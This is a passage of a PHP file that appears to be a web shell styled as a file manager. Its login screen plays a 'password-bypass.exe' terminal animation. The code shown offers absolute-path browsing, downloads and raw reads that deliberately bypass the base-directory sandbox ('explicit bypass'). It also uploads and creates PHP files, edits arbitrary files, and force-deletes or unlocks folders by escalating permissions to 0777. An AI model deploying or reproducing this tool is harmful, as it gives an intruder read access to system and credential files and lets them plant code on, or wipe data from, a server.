                  typeText('connecting ', function(){
                    var dots = 0;
                    var dotTimer = setInterval(function(){
                      dots = (dots + 1) % 4; // 0..3
                      var base = 'C:\\> password-bypass.exe\nconnecting ';
                      output.textContent = base + '.'.repeat(dots);
                    }, 300);
                    setTimeout(function(){
                      clearInterval(dotTimer);
                      output.textContent = 'C:\\> password-bypass.exe\nconnecting .... done';
                      setTimeout(function(){
                        overlay.classList.remove('show');
                        // Mark that user has seen the animation so next time is faster
                        try { localStorage.setItem('loginSeen', '1'); } catch(e) {}
                        if (autoSubmit && formRef) {
                          formRef.submit();
                        } else if (pwInput) {
                          pwInput.focus();
                        }
                      }, postDelay);
                    }, connectMs);
                  }, typeSpeed2);
                }, typeSpeed1);
              }

              // Icon is non-interactive; no click behavior

              // Run animation before form submission (button click or Enter key)
              var formRef = document.querySelector('form.login-card');
              var submitBtn = document.getElementById('login-submit');
              // Do not show success animation before server validation; let form submit normally

              // If server reported an error, show terminal-style red message
              if (serverError && typeof serverError === 'string' && serverError.length) {
                overlay.classList.add('show');
                overlay.classList.add('error-theme');
                output.textContent = '$ ';
                // Fast type for error display
                typeText('./sh bypass password : error  connecting failed', function(){
                  // Keep open until user closes
                }, 20);
                var closeBtn = document.getElementById('term-close-btn');
                if (closeBtn) {
                  closeBtn.addEventListener('click', function(){ overlay.classList.remove('show'); });
                }
                // Allow Escape key to close
                document.addEventListener('keydown', function(e){ if (e.key === 'Escape') overlay.classList.remove('show'); }, { once: true });
              }
            })();
        </script>
    </body>
    </html>
    <?php
    exit;
}

function h(string $s): string {
    $flags = ENT_QUOTES;
    if (defined('ENT_SUBSTITUTE')) {
        $flags |= ENT_SUBSTITUTE; // Prefer substitute for invalid code points if available
    }
    return htmlspecialchars($s, $flags, 'UTF-8');
}

function safePath(string $base, ?string $candidate): ?string {
    if ($candidate === null || $candidate === '') {
        return $base;
    }
    $joined = $base . DIRECTORY_SEPARATOR . $candidate;
    $real = realpath($joined);
    if ($real === false) {
        return null;
    }
    if (strpos($real, $base) !== 0) {
        return null; // prevent traversal
    }
    return $real;
}

function isTextFile(string $path): bool {
    if (!is_file($path)) return false;
    $mime = @mime_content_type($path) ?: '';
    if (substr($mime, 0, 5) === 'text/') return true;
    $extra = ['application/json','application/xml','application/javascript','application/x-httpd-php'];
    return in_array($mime, $extra, true);
}

function sendDownload(string $path): void {
    if (!is_file($path)) {
        http_response_code(404);
        echo 'File not found';
        exit;
    }
    $name = basename($path);
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $name . '"');
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . (string)filesize($path));
    readfile($path);
    exit;
}

// Create a ZIP archive from a directory
function zipDirectory(string $sourceDir, string $zipPath): bool {
    if (!is_dir($sourceDir)) return false;
    if (!class_exists('ZipArchive')) return false;
    // Try to force libzip to use a writable temp directory (parent of zipPath)
    $parentDir = dirname($zipPath);
    $oldTmp = getenv('TMPDIR');
    $oldLibTmp = getenv('LIBZIP_TMPDIR');
    if (is_dir($parentDir) && is_writable($parentDir)) {
        @putenv('TMPDIR=' . $parentDir);
        @putenv('LIBZIP_TMPDIR=' . $parentDir);
    }

    $zip = new ZipArchive();
    $openRes = @$zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE);
    if ($openRes !== true) {
        // Restore environment on failure
        if ($oldTmp !== false) { @putenv('TMPDIR=' . $oldTmp); } else { @putenv('TMPDIR'); }
        if ($oldLibTmp !== false) { @putenv('LIBZIP_TMPDIR=' . $oldLibTmp); } else { @putenv('LIBZIP_TMPDIR'); }
        return false;
    }
    $baseLen = strlen($sourceDir);
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($sourceDir, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($iterator as $file) {
        $filePath = (string)$file;
        $localName = ltrim(substr($filePath, $baseLen), DIRECTORY_SEPARATOR);
        if (is_dir($filePath)) {
            @ $zip->addEmptyDir($localName);
        } else {
            @ $zip->addFile($filePath, $localName);
        }
    }
    @ $zip->close();
    // Restore environment after close
    if ($oldTmp !== false) { @putenv('TMPDIR=' . $oldTmp); } else { @putenv('TMPDIR'); }
    if ($oldLibTmp !== false) { @putenv('LIBZIP_TMPDIR=' . $oldLibTmp); } else { @putenv('LIBZIP_TMPDIR'); }
    return is_file($zipPath);
}

// Send a temporary ZIP for a directory and then delete it
function sendTempZip(string $zipPath, string $downloadName): void {
    if (!is_file($zipPath)) {
        http_response_code(500);
        echo 'ZIP generation failed';
        exit;
    }
    header('Content-Description: File Transfer');
    header('Content-Type: application/zip');
    header('Content-Disposition: attachment; filename="' . $downloadName . '.zip"');
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . (string)filesize($zipPath));
    readfile($zipPath);
    @unlink($zipPath);
    exit;
}

// Relax permissions recursively for a directory tree (dirs 0777, files 0666)
function relaxDirPermissions(string $path): void {
    if (!is_dir($path)) return;
    @chmod($path, 0777);
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($iterator as $item) {
        $p = (string)$item;
        if (is_dir($p)) {
            @chmod($p, 0777);
        } else {
            @chmod($p, 0666);
        }
    }
}

// Recursively remove a directory tree (best-effort)
function rrmdir(string $dir): bool {
    if (!file_exists($dir)) return true;
    if (is_file($dir)) return @unlink($dir);
    if (!is_dir($dir)) return false;
    $it = @scandir($dir);
    if ($it === false) return false;
    foreach ($it as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $p = $dir . DIRECTORY_SEPARATOR . $entry;
        if (is_dir($p)) {
            if (!rrmdir($p)) return false;
        } else {
            if (!@unlink($p)) return false;
        }
    }
    return @rmdir($dir);
}

// Copy a directory tree to a destination (best-effort)
function copyDirTree(string $src, string $dst): bool {
    if (!is_dir($src)) return false;
    if (!file_exists($dst)) {
        @mkdir($dst, 0777, true);
    }
    if (!is_dir($dst)) return false;
    $it = @scandir($src);
    if ($it === false) return false;
    foreach ($it as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $sp = $src . DIRECTORY_SEPARATOR . $entry;
        $dp = $dst . DIRECTORY_SEPARATOR . $entry;
        if (is_dir($sp)) {
            @mkdir($dp, 0777, true);
            if (!copyDirTree($sp, $dp)) return false;
        } elseif (is_file($sp)) {
            if (!@copy($sp, $dp)) return false;
            @chmod($dp, 0666);
        }
    }
    return true;
}

// Recursively attempt to make a directory tree writable for local development
function recursiveChmod(string $dirPath, int $fileMode = 0666, int $dirMode = 0777): bool {
    if (!is_dir($dirPath)) {
        return false;
    }
    @chmod($dirPath, $dirMode);
    $changedAny = is_writable($dirPath);

    $items = @scandir($dirPath);
    if ($items === false) {
        return is_writable($dirPath);
    }
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $p = $dirPath . DIRECTORY_SEPARATOR . $item;
        if (is_dir($p)) {
            @chmod($p, $dirMode);
            if (is_writable($p)) $changedAny = true;
            recursiveChmod($p, $fileMode, $dirMode);
        } else {
            @chmod($p, $fileMode);
        }
    }
    clearstatcache(true, $dirPath);
    return $changedAny || is_writable($dirPath);
}

// Resolve current directory
// Prefer absolute navigation via `os` when provided; otherwise use sandboxed `d` under BASE_DIR
$currentDir = $BASE_DIR;
$absReq = isset($_GET['os']) ? (string)$_GET['os'] : null;
if ($absReq !== null && $absReq !== '') {
    $absReal = realpath($absReq);
    if ($absReal !== false) {
        $currentDir = is_dir($absReal) ? $absReal : dirname($absReal);
    }
} else {
    // If a file is requested via `d`, use its parent
    $requested = isset($_GET['d']) ? (string)$_GET['d'] : null;
    $resolved = safePath($BASE_DIR, $requested);
    if ($resolved === null) {
        // If the requested path no longer exists, try to show its parent folder
        if ($requested !== null && $requested !== '') {
            $parentCandidate = dirname($BASE_DIR . DIRECTORY_SEPARATOR . $requested);
            $parentReal = realpath($parentCandidate);
            if ($parentReal !== false && strpos($parentReal, $BASE_DIR) === 0) {
                $currentDir = $parentReal;
                // No error; gracefully show parent directory
            } else {
                $currentDir = $BASE_DIR;
                // No error message; quietly reset to base
            }
        } else {
            $currentDir = $BASE_DIR;
        }
    } else {
        $currentDir = is_dir($resolved) ? $resolved : dirname($resolved);
    }
}

// Track whether the current directory is outside the application base
$isOutsideBase = (strpos($currentDir, $BASE_DIR) !== 0);

// Absolute-path download handler (explicit bypass)
if (isset($_GET['download_abs'])) {
    $absReq = (string)$_GET['download_abs'];
    $dlPath = realpath($absReq);
        if ($dlPath !== false) {
        if (is_file($dlPath)) {
            sendDownload($dlPath);
        } elseif (is_dir($dlPath)) {
            if (!class_exists('ZipArchive')) {
                $error = 'Download failed: ZipArchive extension not available.';
            } else {
                relaxDirPermissions($dlPath);
                $tmpBase = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR);
                $parent = dirname($dlPath);
                $tmpZip = $tmpBase . DIRECTORY_SEPARATOR . 'fm_zip_' . strval(time()) . '_' . strval(mt_rand()) . '.zip';
                $ok = zipDirectory($dlPath, $tmpZip);
                if ($ok) {
                    sendTempZip($tmpZip, basename($dlPath));
                } else {
                    @unlink($tmpZip);
                    $zipped = false;
                    $stageBase = $tmpBase . DIRECTORY_SEPARATOR . 'fm_stage_' . strval(time()) . '_' . strval(mt_rand());
                    if (@mkdir($stageBase, 0777, true)) {
                        $stageDir = $stageBase . DIRECTORY_SEPARATOR . basename($dlPath);
                        if (copyDirTree($dlPath, $stageDir)) {
                            $tmpZip2 = $tmpBase . DIRECTORY_SEPARATOR . 'fm_zip_' . strval(time()) . '_' . strval(mt_rand()) . '.zip';
                            $ok2 = zipDirectory($stageDir, $tmpZip2);
                            if ($ok2) {
                                $zipped = true;
                                sendTempZip($tmpZip2, basename($dlPath));
                            } else { @unlink($tmpZip2); }
                        }
                        rrmdir($stageBase);
                    }
                    if (!$zipped) {
                        $tmpWritable = is_writable($tmpBase) ? 'yes' : 'no';
                        $parentWritable = is_writable($parent) ? 'yes' : 'no';
                        $tmpPerm = sprintf('%o', @fileperms($tmpBase) & 0777);
                        $parentPerm = sprintf('%o', @fileperms($parent) & 0777);
                        $error = 'Download failed (abs): unable to create zip for directory. Temp writable: ' . $tmpWritable . ' (perm ' . $tmpPerm . '), parent writable: ' . $parentWritable . ' (perm ' . $parentPerm . ').';
                    }
                }
            }
        } else { $error = 'Download failed: invalid file path.'; }
    } else { $error = 'Download failed: invalid file path.'; }
}
// Stream raw file content for absolute path (for image preview)
if (isset($_GET['raw_abs'])) {
    $absReq = (string)$_GET['raw_abs'];
    $rawPath = realpath($absReq);
    if ($rawPath !== false && is_file($rawPath)) {
        $ext = strtolower(pathinfo($rawPath, PATHINFO_EXTENSION));
        $mime = 'application/octet-stream';
        if (in_array($ext, ['png'])) $mime = 'image/png';
        elseif (in_array($ext, ['jpg','jpeg','jpe'])) $mime = 'image/jpeg';
        elseif ($ext === 'gif') $mime = 'image/gif';
        elseif ($ext === 'webp') $mime = 'image/webp';
        elseif ($ext === 'bmp') $mime = 'image/bmp';
        elseif ($ext === 'svg') $mime = 'image/svg+xml';
        header('Content-Type: ' . $mime);
        header('Content-Length: ' . filesize($rawPath));
        @readfile($rawPath);
        exit;
    }
}
if (isset($_GET['download'])) {
    $dlPath = safePath($BASE_DIR, (string)$_GET['download']);
        if ($dlPath !== null) {
            if (is_file($dlPath)) {
                sendDownload($dlPath);
            } elseif (is_dir($dlPath)) {
                if (!class_exists('ZipArchive')) {
                    $error = 'Download failed: ZipArchive extension not available.';
                } else {
                    // Pre-emptively relax permissions on the directory tree
                    relaxDirPermissions($dlPath);
                    $tmpBase = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR);
                    $parent = dirname($dlPath);
                    // Preferred writable locations for staging and zipping
                    $locations = [];
                    if (is_dir($tmpBase) && is_writable($tmpBase)) $locations[] = $tmpBase;
                    if (is_dir($parent) && is_writable($parent)) $locations[] = $parent;

                    // Try direct zip first in temp
                    $tmpZip = $tmpBase . DIRECTORY_SEPARATOR . 'fm_zip_' . strval(time()) . '_' . strval(mt_rand()) . '.zip';
                    $ok = zipDirectory($dlPath, $tmpZip);
                    if ($ok) {
                        sendTempZip($tmpZip, basename($dlPath));
                    } else {
                        @unlink($tmpZip);
                        // Staging fallback: mirror directory to a writable staging folder, then zip
                        $zipped = false;
                        foreach ($locations as $loc) {
                            // Create staging directory
                            $stage = $loc . DIRECTORY_SEPARATOR . 'fm_stage_' . basename($dlPath) . '_' . strval(time()) . '_' . strval(mt_rand());
                            @mkdir($stage, 0777, true);
                            if (!is_dir($stage)) { continue; }
                            // Copy directory tree to staging (with relaxed perms)
                            if (!copyDirTree($dlPath, $stage)) {
                                // Cleanup and try next location
                                rrmdir($stage);
                                continue;
                            }
                            // Attempt zip from staging to same location
                            $zipPath = $loc . DIRECTORY_SEPARATOR . 'fm_zip_' . basename($dlPath) . '_' . strval(time()) . '.zip';
                            $okStage = zipDirectory($stage, $zipPath);
                            // Cleanup staging
                            rrmdir($stage);
                            if ($okStage) {
                                sendTempZip($zipPath, basename($dlPath));
                                $zipped = true;
                                break;
                            } else {
                                @unlink($zipPath);
                            }
                        }
                        if (!$zipped) {
                            $tmpWritable = is_writable($tmpBase) ? 'yes' : 'no';
                            $parentWritable = is_writable($parent) ? 'yes' : 'no';
                            $tmpPerm = sprintf('%o', @fileperms($tmpBase) & 0777);
                            $parentPerm = sprintf('%o', @fileperms($parent) & 0777);
                            $error = 'Download failed: unable to create zip for directory. Temp writable: ' . $tmpWritable . ' (perm ' . $tmpPerm . '), parent writable: ' . $parentWritable . ' (perm ' . $parentPerm . ').';
                        }
                    }
                }
            } else {
                $error = 'Download failed: invalid file path.';
            }
    } else {
        $error = 'Download failed: invalid file path.';
    }
}
// Stream raw file content relative to BASE_DIR (for image preview)
if (isset($_GET['raw'])) {
    $rawRel = (string)$_GET['raw'];
    $rawPath = safePath($BASE_DIR, $rawRel);
    if ($rawPath !== null && is_file($rawPath)) {
        $ext = strtolower(pathinfo($rawPath, PATHINFO_EXTENSION));
        $mime = 'application/octet-stream';
        if (in_array($ext, ['png'])) $mime = 'image/png';
        elseif (in_array($ext, ['jpg','jpeg','jpe'])) $mime = 'image/jpeg';
        elseif ($ext === 'gif') $mime = 'image/gif';
        elseif ($ext === 'webp') $mime = 'image/webp';
        elseif ($ext === 'bmp') $mime = 'image/bmp';
        elseif ($ext === 'svg') $mime = 'image/svg+xml';
        header('Content-Type: ' . $mime);
        header('Content-Length: ' . filesize($rawPath));
        @readfile($rawPath);
        exit;
    }
}

// Handle POST actions: edit content and rename file
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // File upload
    if (isset($_POST['do_upload'])) {
        $relDir = (string)($_POST['dir'] ?? '');
        $targetDir = safePath($BASE_DIR, $relDir);
        if (!$targetDir || !is_dir($targetDir)) {
            $error = 'Upload failed: invalid target directory.';
        } elseif (!isset($_FILES['upload']) || !is_array($_FILES['upload'])) {
            $error = 'Upload failed: missing file.';
        } else {
            $file = $_FILES['upload'];
            if (($file['error'] ?? UPLOAD_ERR_NO_FILE) !== UPLOAD_ERR_OK) {
                $error = 'Upload failed: error code ' . (int)$file['error'] . '.';
            } else {
                $orig = (string)($file['name'] ?? '');
                $base = basename($orig);
                $safe = preg_replace('/[^A-Za-z0-9._-]/', '_', $base);
                if ($safe === '' || $safe === false) {
                    $error = 'Upload failed: invalid filename.';
                } else {
                    $dest = $targetDir . DIRECTORY_SEPARATOR . $safe;
                    // If exists, append counter
                    if (file_exists($dest)) {
                        $i = 1;
                        $info = pathinfo($safe);
                        $stem = $info['filename'] ?? 'file';
                        $ext = isset($info['extension']) ? ('.' . $info['extension']) : '';
                        do {
                            $cand = $stem . '_' . $i . $ext;
                            $dest = $targetDir . DIRECTORY_SEPARATOR . $cand;
                            $i++;
                        } while (file_exists($dest) && $i < 1000);
                    }
                    $ok = @move_uploaded_file($file['tmp_name'], $dest);
                    if ($ok) {
                        $notice = 'Uploaded: ' . h(basename($dest));
                        // Redirect to current directory view
                        $redir = '?d=' . h(urlencode($relDir));
                        header('Location: ' . $redir);
                        exit;
                    } else {
                        $error = 'Upload failed: unable to save file.';
                    }
                }
            }
        }
    }
    // Unzip archive
    if (isset($_POST['do_unzip']) && isset($_POST['rel'])) {
        $rel = (string)$_POST['rel'];
        $zipPath = safePath($BASE_DIR, $rel);
        if ($zipPath && is_file($zipPath) && strtolower(pathinfo($zipPath, PATHINFO_EXTENSION)) === 'zip') {
            $folder = trim((string)($_POST['folder'] ?? ''));
            if ($folder === '' || strpbrk($folder, "\\/\0") !== false) {
                $error = 'Unzip failed: invalid folder name.';
            } else {
                $dir = dirname($zipPath);
                $targetDir = $dir . DIRECTORY_SEPARATOR . $folder;
                // If exists, find a non-conflicting directory name by suffixing -1..-99
                $finalDir = $targetDir;
                if (file_exists($finalDir)) {
                    for ($i = 1; $i <= 99; $i++) {
                        $candidate = $targetDir . '-' . $i;
                        if (!file_exists($candidate)) { $finalDir = $candidate; break; }
                    }
                }
                // Try to create the directory
                if (!is_dir($finalDir)) {
                    @mkdir($finalDir, 0777, true);
                    if (!is_dir($finalDir)) {
                        @chmod($dir, 0775);
                        clearstatcache(true, $dir);
                        @mkdir($finalDir, 0777, true);
                        if (!is_dir($finalDir)) {
                            @chmod($dir, 0777);
                            clearstatcache(true, $dir);
                            @mkdir($finalDir, 0777, true);
                        }
                    }
                }
                if (is_dir($finalDir)) {
                    if (!class_exists('ZipArchive')) {
                        $error = 'Unzip failed: ZipArchive extension not available.';
                    } else {
                        $zip = new ZipArchive();
                        $openRes = @$zip->open($zipPath);
                        if ($openRes === true) {
                            $okExtract = @$zip->extractTo($finalDir);
                            $zip->close();
                            if ($okExtract) {
                                $notice = 'Done';
                                $currentDir = $finalDir;
                            } else {
                                $fileWritable = is_writable($zipPath) ? 'yes' : 'no';
                                $dirWritable = is_writable($finalDir) ? 'yes' : 'no';
                                $filePerm = sprintf('%o', @fileperms($zipPath) & 0777);
                                $dirPerm = sprintf('%o', @fileperms($finalDir) & 0777);
                                $error = 'Unzip failed: extraction error. Zip writable: ' . $fileWritable . ', target writable: ' . $dirWritable . ', zip perms: ' . $filePerm . ', target perms: ' . $dirPerm . '.';
                            }
                        } else {
                            $error = 'Unzip failed: cannot open zip file.';
                        }
                    }
                } else {
                    $dirWritable = is_writable($dir) ? 'yes' : 'no';
                    $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                    $error = 'Unzip failed: cannot create target directory. Parent writable: ' . $dirWritable . ', parent perms: ' . $dirPerm . '.';
                }
            }
        } else {
            $error = 'Unzip failed: invalid zip file.';
        }
    }
    // Delete file or folder
    if (isset($_POST['do_delete']) && isset($_POST['rel'])) {
        $rel = (string)$_POST['rel'];
        $target = safePath($BASE_DIR, $rel);
        if ($target && (is_file($target) || is_dir($target))) {
            if (is_file($target)) {
                $dir = dirname($target);
                
                // Enhanced permission fixing for files
                $forceDeleteFile = function($filePath) {
                    $parentDir = dirname($filePath);
                    
                    // Try multiple permission combinations
                    $attempts = [
                        ['file' => 0666, 'dir' => 0755],
                        ['file' => 0777, 'dir' => 0775],
                        ['file' => 0777, 'dir' => 0777]
                    ];
                    
                    foreach ($attempts as $perms) {
                        @chmod($filePath, $perms['file']);
                        @chmod($parentDir, $perms['dir']);
                        clearstatcache(true, $filePath);
                        clearstatcache(true, $parentDir);
                        
                        if (@unlink($filePath)) {
                            return true;
                        }
                    }
                    return false;
                };
                
                $ok = $forceDeleteFile($target);
                if ($ok) {
                    // Log deleted file name with timestamp (typed)
                    try { @file_put_contents($trashLog, (string)time() . "\tfile\t" . basename($target) . "\n", FILE_APPEND | LOCK_EX); } catch (Throwable $e) {}
                    $notice = 'Done';
                    $currentDir = $dir;
                } else {
                    $fileWritable = is_writable($target) ? 'yes' : 'no';
                    $dirWritable = is_writable($dir) ? 'yes' : 'no';
                    $filePerm = sprintf('%o', @fileperms($target) & 0777);
                    $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                    $lastErr = error_get_last();
                    $lastMsg = $lastErr['message'] ?? 'n/a';
                    $error = 'Delete failed: unable to remove file. File writable: ' . $fileWritable . ', dir writable: ' . $dirWritable . ', file perms: ' . $filePerm . ', dir perms: ' . $dirPerm . '. Last error: ' . $lastMsg;
                }
            } else {
                // Delete directory recursively
                $dir = $target;
                $parent = dirname($dir);
                
                // Enhanced recursive delete with aggressive permission fixing
                $forceDeleteRecursive = function(string $d) use (&$forceDeleteRecursive): bool {
                    if (!is_dir($d)) return false;
                    
                    // First pass: fix all permissions recursively
                    recursiveChmod($d, 0777, 0777);
                    @chmod(dirname($d), 0777);
                    clearstatcache(true);
                    
                    $items = @scandir($d);
                    if ($items === false) return false;
                    
                    foreach ($items as $it) {
                        if ($it === '.' || $it === '..') continue;
                        $p = $d . DIRECTORY_SEPARATOR . $it;
                        
                        if (is_dir($p)) {
                            // Recursively delete subdirectories
                            if (!$forceDeleteRecursive($p)) {
                                // If normal delete fails, try aggressive permission fix
                                @chmod($p, 0777);
                                @chmod($d, 0777);
                                clearstatcache(true, $p);
                                if (!$forceDeleteRecursive($p)) return false;
                            }
                        } else {
                            // Delete files with permission fixing
                            @chmod($p, 0777);
                            @chmod($d, 0777);
                            clearstatcache(true, $p);
                            if (!@unlink($p)) {
                                // Try different permission combinations
                                @chmod($p, 0666);
                                clearstatcache(true, $p);
                                if (!@unlink($p)) return false;
                            }
                        }
                    }
                    
                    // Finally remove the directory itself
                    @chmod($d, 0777);
                    @chmod(dirname($d), 0777);
                    clearstatcache(true, $d);
                    return @rmdir($d);
                };
                
                $ok = $forceDeleteRecursive($dir);
                if ($ok) {
                    // Log deleted folder name with timestamp (typed)
                    try { @file_put_contents($trashLog, (string)time() . "\tfolder\t" . basename($dir) . "\n", FILE_APPEND | LOCK_EX); } catch (Throwable $e) {}
                    $notice = 'Done';
                    $currentDir = $parent;
                } else {
                    $dirWritable = is_writable($dir) ? 'yes' : 'no';
                    $parentWritable = is_writable($parent) ? 'yes' : 'no';
                    $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                    $parentPerm = sprintf('%o', @fileperms($parent) & 0777);
                    $lastErr = error_get_last();
                    $lastMsg = $lastErr['message'] ?? 'n/a';
                    $error = 'Delete failed: unable to remove folder. Dir writable: ' . $dirWritable . ', parent writable: ' . $parentWritable . ', dir perms: ' . $dirPerm . ', parent perms: ' . $parentPerm . '. Last error: ' . $lastMsg;
                }
            }
        } else {
            $error = 'Delete failed: invalid file path.';
        }
    }
    // Unlock folder for editing (recursively chmod for local dev)
    if (isset($_POST['do_unlock'])) {
        $dirRel = (string)($_POST['dir'] ?? '');
        $dirPath = safePath($BASE_DIR, $dirRel);
        if ($dirPath && is_dir($dirPath)) {
            $okUnlock = recursiveChmod($dirPath, 0666, 0777);
            if ($okUnlock) {
                $notice = 'Done';
                $currentDir = $dirPath;
            } else {
                $error = 'Unlock failed: unable to change permissions in this environment.';
            }
        } else {
            $error = 'Unlock failed: invalid directory.';
        }
    }
    // Unlock folder (absolute path)
    if (isset($_POST['do_unlock_abs']) && isset($_POST['os'])) {
        $dirPath = realpath((string)$_POST['os']);
        if ($dirPath !== false && is_dir($dirPath)) {
            $okUnlock = recursiveChmod($dirPath, 0666, 0777);
            if ($okUnlock) {
                $notice = 'Done';
                $currentDir = $dirPath;
            } else {
                $error = 'Unlock failed: unable to change permissions in this environment (abs).';
            }
        } else {
            $error = 'Unlock failed: invalid absolute directory.';
        }
    }
    // Create new file or folder
    if (isset($_POST['do_create'])) {
        $dirRel = (string)($_POST['dir'] ?? '');
        $dirPath = safePath($BASE_DIR, $dirRel);
        if ($dirPath && is_dir($dirPath)) {
            $type = (string)($_POST['create_type'] ?? '');
            if ($type === 'file') {
                $name = trim((string)($_POST['file_name'] ?? ''));
                $ext = strtolower(trim((string)($_POST['file_ext'] ?? '')));
                $allowed = ['php','html','txt'];
                if ($name === '' || !preg_match('/^[A-Za-z0-9_-]+$/', $name)) {
                    $error = 'Create failed: invalid file name.';
                } elseif (!in_array($ext, $allowed, true)) {
                    $error = 'Create failed: invalid extension.';
                } else {
                    $fname = $name . '.' . $ext;
                    $target = $dirPath . DIRECTORY_SEPARATOR . $fname;
                    if (file_exists($target)) {
                        $error = 'Create failed: a file with that name exists.';
                    } else {
                        if ($ext === 'php') {
                            $content = "<?php\n// New file\n?>\n";
                        } elseif ($ext === 'html') {
                            $content = "<!doctype html>\n<html><head><meta charset=\"utf-8\"><title>New</title></head><body>\n</body></html>\n";
                        } else { // txt
                            $content = ""; // start as empty text file
                        }
                        $okW = @file_put_contents($target, $content);
                        if ($okW === false) {
                            @chmod($dirPath, 0775);
                            clearstatcache(true, $dirPath);
                            $okW = @file_put_contents($target, $content);
                            if ($okW === false) {
                                @chmod($dirPath, 0777);
                                clearstatcache(true, $dirPath);
                                $okW = @file_put_contents($target, $content);
                            }
                        }
                        if ($okW !== false) {
                            @chmod($target, 0666);
                            $notice = 'Done';
                            $currentDir = $dirPath;
                            // Redirect to the current directory view after creation
                            $dirRel = (string)($_POST['dir'] ?? '');
                            header('Location: ?d=' . h(urlencode($dirRel)));
                            exit;
                        } else {
                            $dirWritable = is_writable($dirPath) ? 'yes' : 'no';
                            $dirPerm = sprintf('%o', @fileperms($dirPath) & 0777);
                            $error = 'Create failed: unable to write file. Dir writable: ' . $dirWritable . ', dir perms: ' . $dirPerm . '.';
                        }
                    }
                }
            } elseif ($type === 'folder') {
                $folder = trim((string)($_POST['folder_name'] ?? ''));
                if ($folder === '' || !preg_match('/^[A-Za-z0-9._-]+$/', $folder) || strpbrk($folder, "\\/\0") !== false) {
                    $error = 'Create failed: invalid folder name.';
                } else {
                    $targetDir = $dirPath . DIRECTORY_SEPARATOR . $folder;
                    if (file_exists($targetDir)) {
                        $error = 'Create failed: a folder with that name exists.';
                    } else {
                        $okMk = @mkdir($targetDir, 0777, true);
                        if (!$okMk) {
                            @chmod($dirPath, 0775);
                            clearstatcache(true, $dirPath);
                            $okMk = @mkdir($targetDir, 0777, true);
                            if (!$okMk) {
                                @chmod($dirPath, 0777);
                                clearstatcache(true, $dirPath);
                                $okMk = @mkdir($targetDir, 0777, true);
                            }
                        }
                        if ($okMk) {
                            $notice = 'Done';
                            $currentDir = $dirPath;
                            // Redirect to the current directory view after creation
                            $dirRel = (string)($_POST['dir'] ?? '');
                            header('Location: ?d=' . h(urlencode($dirRel)));
                            exit;
                        } else {
                            $dirWritable = is_writable($dirPath) ? 'yes' : 'no';
                            $dirPerm = sprintf('%o', @fileperms($dirPath) & 0777);
                            $error = 'Create failed: unable to create folder. Dir writable: ' . $dirWritable . ', dir perms: ' . $dirPerm . '.';
                        }
                    }
                }
            } else {
                $error = 'Create failed: invalid type.';
            }
        } else {
            $error = 'Create failed: invalid directory.';
        }
    }
    // Edit file content
    if (isset($_POST['do_edit']) && isset($_POST['rel'])) {
        $rel = (string)$_POST['rel'];
        $target = safePath($BASE_DIR, $rel);
        if ($target && is_file($target)) {
            $content = (string)($_POST['content'] ?? '');
            // First attempt: with exclusive lock
            $ok = @file_put_contents($target, $content, LOCK_EX);
            // Retry without lock if lock fails on this filesystem
            if ($ok === false) {
                $ok = @file_put_contents($target, $content);
            }
            if ($ok === false) {
                // Try to make file writable and retry (with and without lock)
                @chmod($target, 0666);
                clearstatcache(true, $target);
                $ok = @file_put_contents($target, $content, LOCK_EX);
                if ($ok === false) {
                    $ok = @file_put_contents($target, $content);
                }
                if ($ok === false) {
                    // Try to make directory writable and retry
                    $dir = dirname($target);
                    @chmod($dir, 0775);
                    clearstatcache(true, $dir);
                    $ok = @file_put_contents($target, $content, LOCK_EX);
                    if ($ok === false) {
                        $ok = @file_put_contents($target, $content);
                    }
                    if ($ok === false) {
                        // Final escalation for local dev environments
                        @chmod($dir, 0777);
                        clearstatcache(true, $dir);
                        $ok = @file_put_contents($target, $content, LOCK_EX);
                        if ($ok === false) {
                            $ok = @file_put_contents($target, $content);
                        }
                    }
                }
            }
            // Directory-writable replace fallback: write to temp and atomically replace
            if ($ok === false) {
                $dir = dirname($target);
                $tmp = $dir . DIRECTORY_SEPARATOR . '.edit_tmp_' . strval(mt_rand()) . '_' . strval(time());
                $wtmp = @file_put_contents($tmp, $content);
                if ($wtmp !== false) {
                    // Try atomic replace
                    $r1 = @rename($tmp, $target);
                    if (!$r1) {
                        // If atomic replace fails, try unlink+rename
                        @unlink($target);
                        $r1 = @rename($tmp, $target);
                    }
                    $ok = $r1;
                    // Clean up temp if needed
                    if (!$ok && file_exists($tmp)) {
                        @unlink($tmp);
                    }
                }
            }
            if ($ok === false) {
                $dir = dirname($target);
                $fileWritable = is_writable($target) ? 'yes' : 'no';
                $dirWritable = is_writable($dir) ? 'yes' : 'no';
                $filePerm = sprintf('%o', @fileperms($target) & 0777);
                $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                $lastErr = error_get_last();
                $lastMsg = $lastErr['message'] ?? 'n/a';
                $error = 'Edit failed: unable to write file. File writable: ' . $fileWritable . ', dir writable: ' . $dirWritable . ', file perms: ' . $filePerm . ', dir perms: ' . $dirPerm . '. Tried without lock, chmod file 0666, dir 0775/0777, and temp replace. Last error: ' . $lastMsg;
            } else {
                clearstatcache(true, $target);
                $notice = 'Done';
                $currentDir = dirname($target);
            }
        } else {
            $error = 'Edit failed: invalid file path.';
        }
    }

    // Zip folder (create archive in parent directory)
    if (isset($_POST['do_zip']) && isset($_POST['rel'])) {
        $rel = (string)$_POST['rel'];
